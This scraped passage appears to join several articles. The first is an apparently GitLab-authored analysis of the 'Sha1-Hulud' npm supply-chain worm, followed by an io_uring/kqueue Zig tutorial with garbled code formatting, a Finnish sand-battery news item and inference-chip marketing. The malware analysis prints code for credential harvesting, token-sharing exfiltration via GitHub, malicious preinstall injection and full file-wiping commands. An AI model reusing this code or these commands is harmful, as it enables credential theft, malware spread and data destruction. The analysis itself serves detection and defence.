&lt;/code&gt;&lt;p&gt;The &lt;code&gt;setup_bun.js&lt;/code&gt; loader downloads or locates the Bun runtime on the system, then executes the bundled &lt;code&gt;bun_environment.js&lt;/code&gt; payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.&lt;/p&gt;&lt;p&gt;Once executed, the malware immediately begins credential discovery across multiple sources:&lt;/p&gt;&lt;code&gt;ghp_&lt;/code&gt; (GitHub personal access token) or &lt;code&gt;gho_&lt;/code&gt;(GitHub OAuth token)&lt;code&gt;.npmrc&lt;/code&gt; files and environment variables, which are common locations for securely storing sensitive configuration and credentials.&lt;code&gt;async function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
&lt;/code&gt;
&lt;p&gt;The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.&lt;/p&gt;&lt;code&gt;async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
&lt;/code&gt;
&lt;p&gt;Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.&lt;/p&gt;&lt;code&gt;// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token &amp;amp;&amp;amp; await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
&lt;/code&gt;
&lt;p&gt;Using stolen npm tokens, the malware:&lt;/p&gt;&lt;code&gt;setup_bun.js&lt;/code&gt; loader into each package's preinstall scripts&lt;code&gt;bun_environment.js&lt;/code&gt; payload&lt;code&gt;async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
&lt;/code&gt;
&lt;p&gt;Our analysis uncovered a destructive payload designed to protect the malwareâs infrastructure against takedown attempts.&lt;/p&gt;&lt;p&gt;The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses &lt;code&gt;shred&lt;/code&gt; to overwrite files before deletion, making recovery nearly impossible.&lt;/p&gt;&lt;code&gt;// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" &amp;amp;&amp;amp; " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" &amp;amp; " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 &amp;amp;&amp;amp; " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
&lt;/code&gt;
&lt;p&gt;This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the userâs data when a takedown is detected.&lt;/p&gt;&lt;p&gt;To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.&lt;/p&gt;&lt;table&gt;&lt;row span="3"&gt;&lt;cell role="head"&gt;Type&lt;/cell&gt;&lt;cell role="head"&gt;Indicator&lt;/cell&gt;&lt;cell role="head"&gt;Description&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;bun_environment.js&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Malicious post-install script in node_modules directories&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Hidden directory created in user home for Trufflehog binary storage&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;directory&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/extract/&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Temporary directory used for binary extraction&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Linux/Mac)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;file&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;.truffler-cache/trufflehog.exe&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Downloaded Trufflehog binary (Windows)&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;del /F /Q /S "%USERPROFILE%*"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;shred -uvz -n 1&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Linux/Mac destructive payload command&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;process&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;cipher /W:%USERPROFILE%&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows secure deletion command in payload&lt;/cell&gt;&lt;/row&gt;&lt;row span="3"&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;curl -fsSL https://bun.sh/install | bash&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Suspicious Bun installation during NPM package install&lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;command&lt;/cell&gt;&lt;cell&gt;&lt;code&gt;powershell -c "irm bun.sh/install.ps1|iex"&lt;/code&gt;&lt;/cell&gt;&lt;cell&gt;Windows Bun installation via PowerShell&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.&lt;/p&gt;&lt;p&gt;First, enable Dependency Scanning to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your &lt;code&gt;package-lock.json&lt;/code&gt; or &lt;code&gt;yarn.lock&lt;/code&gt; files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation.&lt;/p&gt;&lt;p&gt;Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.&lt;/p&gt;&lt;p&gt;Next, GitLab Duo Chat can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like:&lt;/p&gt;&lt;p&gt;The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.&lt;/p&gt;&lt;p&gt;For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.&lt;/p&gt;&lt;p&gt;This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.&lt;/p&gt;&lt;p&gt;GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/"/><published>2025-11-27T15:36:56+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070668</id><title>Same-day upstream Linux support for Snapdragon 8 Elite Gen 5</title><updated>2025-11-28T11:33:56.665151+00:00</updated><content>&lt;doc fingerprint="e10fcdab2cdf53e4"&gt;
  &lt;main&gt;
    &lt;p&gt;You need to enable JavaScript to run this app.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.qualcomm.com/developer/blog/2025/10/same-day-snapdragon-8-elite-gen-5-upstream-linux-support"/><published>2025-11-27T16:19:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073817</id><title>A programmer-friendly I/O abstraction over io_uring and kqueue (2022)</title><updated>2025-11-28T11:33:56.253675+00:00</updated><content>&lt;doc fingerprint="7a1e315b29e0178f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;A Programmer-Friendly I/O Abstraction Over io_uring and kqueue&lt;/head&gt;
    &lt;p&gt;Consider this tale of I/O and performance. Weâll start with blocking I/O, explore io_uring and kqueue, and take home an event loop very similar to some software you may find familiar.&lt;/p&gt;
    &lt;p&gt;This is a twist on Kingâs talk at Software You Can Love Milan â22.&lt;/p&gt;
    &lt;p&gt;When you want to read from a file you might &lt;code&gt;open()&lt;/code&gt; and
then call &lt;code&gt;read()&lt;/code&gt; as many times as necessary to fill a
buffer of bytes from the file. And in the opposite direction, you call
&lt;code&gt;write()&lt;/code&gt; as many times as needed until everything is
written. Itâs similar for a TCP client with sockets, but instead of
&lt;code&gt;open()&lt;/code&gt; you first call &lt;code&gt;socket()&lt;/code&gt; and then
&lt;code&gt;connect()&lt;/code&gt; to your server. Fun stuff.&lt;/p&gt;
    &lt;p&gt;In the real world though you canât always read everything you want immediately from a file descriptor. Nor can you always write everything you want immediately to a file descriptor.&lt;/p&gt;
    &lt;p&gt;You can switch a file descriptor into non-blocking mode so the call wonât block while data you requested is not available. But system calls are still expensive, incurring context switches and cache misses. In fact, networks and disks have become so fast that these costs can start to approach the cost of doing the I/O itself. For the duration of time a file descriptor is unable to read or write, you donât want to waste time continuously retrying read or write system calls.&lt;/p&gt;
    &lt;p&gt;So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (Iâm skipping the generation of epoll/select users.) These APIs let you submit requests to the kernel to learn about readiness: when a file descriptor is ready to read or write. You can send readiness requests in batches (also referred to as queues). Completion events, one for each submitted request, are available in a separate queue.&lt;/p&gt;
    &lt;p&gt;Being able to batch I/O like this is especially important for TCP servers that want to multiplex reads and writes for multiple connected clients.&lt;/p&gt;
    &lt;p&gt;However in io_uring, you can even go one step further. Instead of having to call &lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; in userland
after a readiness event, you can request that the kernel do the
&lt;code&gt;read()&lt;/code&gt; or &lt;code&gt;write()&lt;/code&gt; itself with a buffer you
provide. Thus almost all of your I/O is done in the kernel, amortizing
the overhead of system calls.&lt;/p&gt;
    &lt;p&gt;If you havenât seen io_uring or kqueue before, youâd probably like an example! Consider this code: a simple, minimal, not-production-ready TCP echo server.&lt;/p&gt;
    &lt;code&gt;const std = @import("std");
const os = std.os;
const linux = os.linux;
const allocator = std.heap.page_allocator;

const State = enum{ accept, recv, send };
const Socket = struct {
: os.socket_t,
     handle: [1024]u8,
     buffer: State,
     state
 };
pub fn main() !void {
const entries = 32;
     const flags = 0;
     var ring = try linux.IO_Uring.init(entries, flags);
     defer ring.deinit();
     
var server: Socket = undefined;
     .handle = try os.socket(os.AF.INET, os.SOCK.STREAM, os.IPPROTO.TCP);
     serverdefer os.closeSocket(server.handle);
     
const port = 12345;
     var addr = std.net.Address.initIp4(.{127, 0, 0, 1}, port);
     var addr_len: os.socklen_t = addr.getOsSockLen();
     
try os.setsockopt(server.handle, os.SOL.SOCKET, os.SO.REUSEADDR, &amp;amp;std.mem.toBytes(@as(c_int, 1)));
     try os.bind(server.handle, &amp;amp;addr.any, addr_len);
     const backlog = 128;
     try os.listen(server.handle, backlog);
     
.state = .accept;
     server= try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
     _ 
while (true) {
     = try ring.submit_and_wait(1);
         _ 
while (ring.cq_ready() &amp;gt; 0) {
         const cqe = try ring.copy_cqe();
             var client = @intToPtr(*Socket, @intCast(usize, cqe.user_data));
             
if (cqe.res &amp;lt; 0) std.debug.panic("{}({}): {}", .{
             .state,
                 client.handle,
                 client@intToEnum(os.E, -cqe.res),
                 
             });
switch (client.state) {
             .accept =&amp;gt; {
                 = try allocator.create(Socket);
                     client .handle = @intCast(os.socket_t, cqe.res);
                     client.state = .recv;
                     client= try ring.recv(@ptrToInt(client), client.handle, .{.buffer = &amp;amp;client.buffer}, 0);
                     _ = try ring.accept(@ptrToInt(&amp;amp;server), server.handle, &amp;amp;addr.any, &amp;amp;addr_len, 0);
                     _ ,
                 }.recv =&amp;gt; {
                 const read = @intCast(usize, cqe.res);
                     .state = .send;
                     client= try ring.send(@ptrToInt(client), client.handle, client.buffer[0..read], 0);
                     _ ,
                 }.send =&amp;gt; {
                 .closeSocket(client.handle);
                     os.destroy(client);
                     allocator,
                 }
             }
         }
     } }&lt;/code&gt;
    &lt;p&gt;This is a great, minimal example. But notice that this code ties io_uring behavior directly to business logic (in this case, handling echoing data between request and response). It is fine for a small example like this. But in a large application you might want to do I/O throughout the code base, not just in one place. You might not want to keep adding business logic to this single loop.&lt;/p&gt;
    &lt;p&gt;Instead, you might want to be able to schedule I/O and pass a callback (and sometimes with some application context) to be called when the event is complete.&lt;/p&gt;
    &lt;p&gt;The interface might look like:&lt;/p&gt;
    &lt;code&gt;.dispatch({
 io_dispatch// some big struct/union with relevant fields for all event types
     , my_callback); }&lt;/code&gt;
    &lt;p&gt;This is great! Now your business logic can schedule and handle I/O no matter where in the code base it is.&lt;/p&gt;
    &lt;p&gt;Under the hood it can decide whether to use io_uring or kqueue depending on what kernel itâs running on. The dispatch can also batch these individual calls through io_uring or kqueue to amortize system calls. The application no longer needs to know the details.&lt;/p&gt;
    &lt;p&gt;Additionally, we can use this wrapper to stop thinking about readiness events, just I/O completion. That is, if we dispatch a read event, the io_uring implementation would actually ask the kernel to read data into a buffer. Whereas the kqueue implementation would send a âreadâ readiness event, do the read back in userland, and then call our callback.&lt;/p&gt;
    &lt;p&gt;And finally, now that weâve got this central dispatcher, we donât need spaghetti code in a loop switching on every possible submission and completion event.&lt;/p&gt;
    &lt;p&gt;Every time we call io_uring or kqueue we both submit event requests and poll for completion events. The io_uring and kqueue APIs tie these two actions together in the same system call.&lt;/p&gt;
    &lt;p&gt;To sync our requests to io_uring or kqueue weâll build a &lt;code&gt;flush&lt;/code&gt; function that submits requests and polls for
completion events. (In the next section weâll talk about how the user of
the central dispatch learns about completion events.)&lt;/p&gt;
    &lt;p&gt;To make &lt;code&gt;flush&lt;/code&gt; more convenient, weâll build a nice
wrapper around it so that we can submit as many requests (and process as
many completion events) as possible. To avoid accidentally blocking
indefinitely weâll also introduce a time limit. Weâll call the wrapper
&lt;code&gt;run_for_ns&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Finally weâll put the user in charge of setting up a loop to call this &lt;code&gt;run_for_ns&lt;/code&gt; function, independent of normal program
execution.&lt;/p&gt;
    &lt;p&gt;This is now your traditional event loop.&lt;/p&gt;
    &lt;p&gt;You may have noticed that in the API above we passed a callback. The idea is that after the requested I/O has completed, our callback should be invoked. But the question remains: how to track this callback between the submission and completion queue?&lt;/p&gt;
    &lt;p&gt;Thankfully, io_uring and kqueue events have user data fields. The user data field is opaque to the kernel. When a submitted event completes, the kernel sends a completion event back to userland containing the user data value from the submission event.&lt;/p&gt;
    &lt;p&gt;We can store the callback in the user data field by setting it to the callbackâs pointer casted to an integer. When the completion for a requested event comes up, we cast from the integer in the user data field back to the callback pointer. Then, we invoke the callback.&lt;/p&gt;
    &lt;p&gt;As described above, the struct for &lt;code&gt;io_dispatch.dispatch&lt;/code&gt;
could get quite large handling all the different kinds of I/O events and
their arguments. We could make our API a little more expressive by
creating wrapper functions for each event type.&lt;/p&gt;
    &lt;p&gt;So if we wanted to schedule a read function we could call:&lt;/p&gt;
    &lt;code&gt;.read(fd, &amp;amp;buf, nBytesToRead, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;Or to write, similarly:&lt;/p&gt;
    &lt;code&gt;.write(fd, buf, nBytesToWrite, callback); io_dispatch&lt;/code&gt;
    &lt;p&gt;One more thing we need to worry about is that the batch we pass to io_uring or kqueue has a fixed size (technically, kqueue allows any batch size but using that might introduce unnecessary allocations). So weâll build our own queue on top of our I/O abstraction to keep track of requests that we could not immediately submit to io_uring or kqueue.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;To keep this API simple we could allocate for each entry in the queue. Or we could modify the&lt;/p&gt;&lt;code&gt;io_dispatch.X&lt;/code&gt;calls slightly to accept a struct that can be used in an intrusive linked list to contain all request context, including the callback. The latter is what we do in TigerBeetle.&lt;/quote&gt;
    &lt;p&gt;Put another way: every time code calls &lt;code&gt;io_dispatch&lt;/code&gt;,
weâll try to immediately submit the requested event to io_uring or
kqueue. But if thereâs no room, we store the event in an overflow
queue.&lt;/p&gt;
    &lt;p&gt;The overflow queue needs to be processed eventually, so we update our &lt;code&gt;flush&lt;/code&gt; function (described in Callbacks and context above) to pull
as many events from our overflow queue before submitting a batch to
io_uring or kqueue.&lt;/p&gt;
    &lt;p&gt;Weâve now built something similar to libuv, the I/O library that Node.js uses. And if you squint, it is basically TigerBeetleâs I/O library! (And interestingly enough, TigerBeetleâs I/O code was adopted into Bun! Open-source for the win!)&lt;/p&gt;
    &lt;p&gt;Letâs check out how the Darwin version of TigerBeetleâs I/O library (with kqueue) differs from the Linux version. As mentioned, the complete &lt;code&gt;send&lt;/code&gt; call in the
Darwin implementation waits for file descriptor readiness (through
kqueue). Once ready, the actual &lt;code&gt;send&lt;/code&gt; call is made back in
userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) self.submit(
     ,
         context,
         callback,
         completion.send,
         .{
         .socket = socket,
             .buf = buffer.ptr,
             .len = @intCast(u32, buffer_limit(buffer.len)),
             ,
         }struct {
         fn do_operation(op: anytype) SendError!usize {
             return os.send(op.socket, op.buf[0..op.len], 0);
                 
             },
         }
     ); }&lt;/code&gt;
    &lt;p&gt;Compare this to the Linux version (with io_uring) where the kernel handles everything and there is no send system call in userland:&lt;/p&gt;
    &lt;code&gt;pub fn send(
self: *IO,
     comptime Context: type,
     : Context,
     contextcomptime callback: fn (
     : Context,
         context: *Completion,
         completion: SendError!usize,
         resultvoid,
     ) : *Completion,
     completion: os.socket_t,
     socket: []const u8,
     buffervoid {
 ) .* = .{
     completion.io = self,
         .context = context,
         .callback = struct {
         fn wrapper(ctx: ?*anyopaque, comp: *Completion, res: *const anyopaque) void {
             
                 callback(@intToPtr(Context, @ptrToInt(ctx)),
                     ,
                     comp@intToPtr(*const SendError!usize, @ptrToInt(res)).*,
                     
                 );
             }.wrapper,
         }.operation = .{
         .send = .{
             .socket = socket,
                 .buffer = buffer,
                 ,
             },
         }
     };// Fill out a submission immediately if possible, otherwise adds to overflow buffer
     self.enqueue(completion);
      }&lt;/code&gt;
    &lt;p&gt;Similarly, take a look at &lt;code&gt;flush&lt;/code&gt; on Linux
and macOS
for event processing. Look at &lt;code&gt;run_for_ns&lt;/code&gt; on Linux
and macOS
for the public API users must call. And finally, look at what puts this
all into practice, the loop calling &lt;code&gt;run_for_ns&lt;/code&gt; in
src/main.zig.&lt;/p&gt;
    &lt;p&gt;Weâve come this far and you might be wondering â what about cross-platform support for Windows? The good news is that Windows also has a completion based system similar to io_uring but without batching, called IOCP. And for bonus points, TigerBeetle provides the same I/O abstraction over it! But itâs enough to cover just Linux and macOS in this post. :)&lt;/p&gt;
    &lt;p&gt;In both this blog post and in TigerBeetle, we implemented a single-threaded event loop. Keeping I/O code single-threaded in userspace is beneficial (whether or not I/O processing is single-threaded in the kernel is not our concern). Itâs the simplest code and best for workloads that are not embarrassingly parallel. It is also best for determinism, which is integral to the design of TigerBeetle because it enables us to do Deterministic Simulation Testing&lt;/p&gt;
    &lt;p&gt;But there are other valid architectures for other workloads.&lt;/p&gt;
    &lt;p&gt;For workloads that are embarrassingly parallel, like many web servers, you could instead use multiple threads where each thread has its own queue. In optimal conditions, this architecture has the highest I/O throughput possible.&lt;/p&gt;
    &lt;p&gt;But if each thread has its own queue, individual threads can become starved if an uneven amount of work is scheduled on one thread. In the case of dynamic amounts of work, the better architecture would be to have a single queue but multiple worker threads doing the work made available on the queue.&lt;/p&gt;
    &lt;p&gt;Hey, maybe weâll split this out so you can use it too. Itâs written in Zig so we can easily expose a C API. Any language with a C foreign function interface (i.e. every language) should work well with it. Keep an eye on our GitHub. :)&lt;/p&gt;
    &lt;p&gt;Additional resources:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/"/><published>2025-11-27T22:41:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46073855</id><title>250MWh 'Sand Battery' to start construction in Finland</title><updated>2025-11-28T11:33:55.697743+00:00</updated><content>&lt;doc fingerprint="b76f0758cbd3b7b"&gt;
  &lt;main&gt;
    &lt;p&gt;Technology provider Polar Night Energy and utility Lahti Energia have partnered for a large-scale project using Polar’s ‘Sand Battery’ technology for the latter’s district heating network in Vääksy, Finland.&lt;/p&gt;
    &lt;p&gt;The project will have a heating power of 2MW and a thermal energy storage (TES) capacity of 250MW, making it a 125-hour system and the largest sand-based TES project once complete.&lt;/p&gt;
    &lt;p&gt;It will supply heat to Lahti Energia’s Vääksy district heating network but is also large enough to participate in Fingrid’s reserve and grid balancing markets.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy’s technology works by heating a sand or a similar solid material using electricity, retaining that heat and then discharging that for industrial or heating use.&lt;/p&gt;
    &lt;head rend="h2"&gt;Try Premium for just $1&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Full premium access for the first month at only $1&lt;/item&gt;
      &lt;item&gt;Converts to an annual rate after 30 days unless cancelled&lt;/item&gt;
      &lt;item&gt;Cancel anytime during the trial period&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Premium Benefits&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Expert industry analysis and interviews&lt;/item&gt;
      &lt;item&gt;Digital access to PV Tech Power journal&lt;/item&gt;
      &lt;item&gt;Exclusive event discounts&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Or get the full Premium subscription right away&lt;/head&gt;
    &lt;head rend="h3"&gt;Or continue reading this article for free&lt;/head&gt;
    &lt;p&gt;The project will cut fossil-based emissions in the Vääksy district heating network by around 60% each year, by reducing natural gas use bu 80% and also decreasing wood chip consumption.&lt;/p&gt;
    &lt;p&gt;It follows Polar Night Energy completing and putting a 1MW/100MWh Sand Battery TES project into commercial operations this summer, for another utility Loviisan Lämpö. That project uses soapstone as its storage medium, a byproduct of ceramics production.&lt;/p&gt;
    &lt;p&gt;This latest project will use locally available natural sand, held in a container 14m high and 15m wide. Lahti Energia received a grant for the project from state body Business Finland.&lt;/p&gt;
    &lt;p&gt;Polar Night Energy will act as the main contractor for the construction project, with on-site work beginning in early 2026, and the Sand Battery will be completed in summer 2027.&lt;/p&gt;
    &lt;p&gt;“We want to offer our customers affordable district heating and make use of renewable energy in our heat production. The scale of this Sand Battery also enables us to participate in Fingrid’s reserve and grid balancing markets. As the share of weather-dependent energy grows in the grid, the Sand Battery will contribute to balancing electricity supply and demand”, says Jouni Haikarainen, CEO of Lahti Energia.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.energy-storage.news/250mwh-sand-battery-to-start-construction-in-finland-for-both-heating-and-ancillary-services/"/><published>2025-11-27T22:48:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46074111</id><title>Vsora Jotunn-8 5nm European inference chip</title><updated>2025-11-28T11:33:54.584205+00:00</updated><content>&lt;doc fingerprint="a495c47b155c4c8f"&gt;
  &lt;main&gt;
    &lt;p&gt;In modern data centers, success means deploying trained models with blistering speed, minimal cost, and effortless scalability. Designing and operating inference systems requires balancing key factors such as high throughput, low latency, optimized power consumption, and sustainable infrastructure. Achieving optimal performance while maintaining cost and energy efficiency is critical to meeting the growing demand for large-scale, real-time AI services across a variety of applications.&lt;/p&gt;
    &lt;p&gt;Unlock the full potential of your AI investments with our high-performance inference solutions. Engineered for speed, efficiency, and scalability, our platform ensures your AI models deliver maximum impact—at lower operational costs and with a commitment to sustainability. Whether you’re scaling up deployments or optimizing existing infrastructure, we provide the technology and expertise to help you stay competitive and drive business growth.&lt;/p&gt;
    &lt;p&gt;This is not just faster inference. It’s a new foundation for AI at scale.&lt;/p&gt;
    &lt;p&gt;In the world of AI data centers, speed, efficiency, and scale aren’t optional—they’re everything. Jotunn8, our ultra-high-performance inference chip is built to deploy trained models with lightning-fast throughput, minimal cost, and maximum scalability. Designed around what matters most—performance, cost-efficiency, and sustainability—they deliver the power to run AI at scale, without compromise!&lt;/p&gt;
    &lt;p&gt;Why it matters: Critical for real-time applications like chatbots, fraud detection, and search.&lt;/p&gt;
    &lt;p&gt;Reasoning models, Generative AI and Agentic AI are increasingly being combined to build more capable and reliable systems. Generative AI provide flexibility and language fluency. Reasoning models provide rigor and correctness. Agentic frameworks provide autonomy and decision-making. The VSORA architecture enables smooth and easy integration of these algorithms, providing near-theory performance.&lt;/p&gt;
    &lt;p&gt;Why it matters: AI inference is often run at massive scale – reducing cost per inference is essential for business viability.&lt;/p&gt;
    &lt;p&gt;Unmatched Performance at the Edge with Edge AI.&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V core to offload &amp;amp; run AI completely on-chip&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8: 1600 Tflops&lt;lb/&gt;fp16: 400 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8: 800 Tflops&lt;lb/&gt;fp16: 200 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 4&lt;lb/&gt;fp8/int8: 50 Tflops&lt;lb/&gt;fp16/int16: 25 Tflops&lt;lb/&gt;fp32/int32: 12 Tflops&lt;/p&gt;
    &lt;p&gt;Tyr 2&lt;lb/&gt;fp8/int8: 25 Tflops&lt;lb/&gt;fp16/int16: 12 Tflops&lt;lb/&gt;fp32/int32: 6 Tflops&lt;/p&gt;
    &lt;p&gt;Close to theory efficiency&lt;/p&gt;
    &lt;p&gt;Fully programmable&lt;/p&gt;
    &lt;p&gt;Algorithm agnostic&lt;/p&gt;
    &lt;p&gt;Host processor agnostic&lt;/p&gt;
    &lt;p&gt;RISC-V cores to offload host &lt;lb/&gt;&amp;amp; run AI completely on-chip.&lt;/p&gt;
    &lt;p&gt;fp8: 3200 Tflops&lt;lb/&gt;fp16: 800 Tflops &lt;/p&gt;
